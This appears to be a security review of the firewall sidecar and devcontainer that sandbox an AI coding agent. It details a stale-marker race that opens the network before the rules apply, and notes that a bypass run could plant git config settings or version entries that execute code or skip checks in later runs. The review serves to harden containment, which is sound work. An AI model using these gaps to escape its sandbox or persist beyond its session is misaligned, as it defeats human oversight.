| features map row                                           | n/a (tooling)                                                                                                                                                                                                                                                        |
| would a test fail if one changed line were reverted        | `runner` `cap_drop` → S5 CapBnd; `network_mode` → S1; marker `touch` → runner never healthy, lead step 1 fails. Deleting the marker's staleness (finding 1) → nothing fails                                                                                          |

### Findings

```
[1] KIND: correctness
    WHERE: .devcontainer/runner/init-firewall.sh:55 (`touch /run/level-up-lab-firewall-ready`, never removed);
           .devcontainer/runner/docker-compose.yml:31-35 (healthcheck), :39-41 (depends_on service_healthy)
    DEFECT: the ready marker lives in the firewall container's writable layer (Docker mounts no tmpfs on /run), so
            from the second start on the healthcheck passes before init-firewall.sh has applied anything.
    TRIGGER: `up -d --build`, then `docker compose -f .devcontainer/runner/docker-compose.yml stop` (or a Docker
            Desktop restart; no restart policy), then `up -d`. Stand-in run: first `up` 17 s, runner started 1 s after
            "ready"; second `up` 3 s, firewall log `init start … marker=stale`, runner started 3 s after init began,
            12 s before init would have marked ready.
    WRONG BEHAVIOUR: the plan says "firewall fails → runner never starts" and "starts only once firewall is healthy".
            Instead, a restarted firewall gets a fresh network namespace with no filter rules, and runner joins it
            while init-firewall.sh is still resolving (curl meta up to 20 s, five digs, the self-check). Any exec in
            that window (the lead's `git clone`, `pnpm install`, B1.59's tick) has an open network. If init then dies
            (meta refused, example.com reachable), runner has already started. It then loses eth0 (stand-in: after
            `kill firewall`, runner keeps only lo), so it fails closed afterwards, not before. What limits the damage:
            `run.sh --mode` reads `dontAsk` while example.com answers, so no run gets bypass in the window.
            Fix: remove the marker first thing in init-firewall.sh (`rm -f` right after the root check), or
            `tmpfs: [/run]` on `firewall`. Add `stop` + `up -d` + `sandbox-probe.sh` to the lead's steps so a restart
            is proven, not only the first start. Also fix the stale comment at init-firewall.sh:20: "PID 1 is this
            script, so nothing else runs yet" is wrong with `init: true` and a sidecar.
    CONFIDENCE: confirmed on the stand-in (same healthcheck, depends_on, network_mode shape); the real image's init
            timing [unverified]
```

### Not blocking, for the lead

1. Two services with `build: .` and no `image:` produce two tags (`level-up-lab-runner-firewall`, `-runner`).
   BuildKit shares the cache within one `up --build`, so the content matches. "One image" holds in substance only;
   `image: level-up-lab-runner:local` on both would make it literal. [unverified on the real build]
2. `runner-runs` now holds `GIT_CONFIG_GLOBAL` and `verified-versions`, and a bypass run can write both. A
   `core.fsmonitor` or `credential.helper` line then executes in later runs. A future version string appended to
   `verified-versions` would let a later pin skip `--check-binary`. The cost line names only the clone's
   `.git/hooks`, `.git/config` and `runner-claude`; it should add `runner-runs`.
3. The PR body's Evidence says "plan deviations: none" while a "Changed after approval" block waits for re-approval.
4. The healthcheck has no `start_period`: 30 × 2 s. A slow meta fetch (≤ 20 s) plus five digs fits in the usual case.

Verdict: back to code-writer (finding 1: a one-line marker reset or a tmpfs, the restart step in the lead's commands,
and the "Changed after approval" block amended to say so plus note 2's cost). After that, the lead's re-approval of
the block. Pass-1 findings 1–3 are closed.

Riskiest unfalsified: whether init-firewall.sh completes at all on Docker Desktop with root and only NET_ADMIN/NET_RAW
(ipset kernel module, iptables-nft, upstream DNS through 127.0.0.11 with OUTPUT open only on lo). Nobody has built the
image, and every in-container probe depends on it.
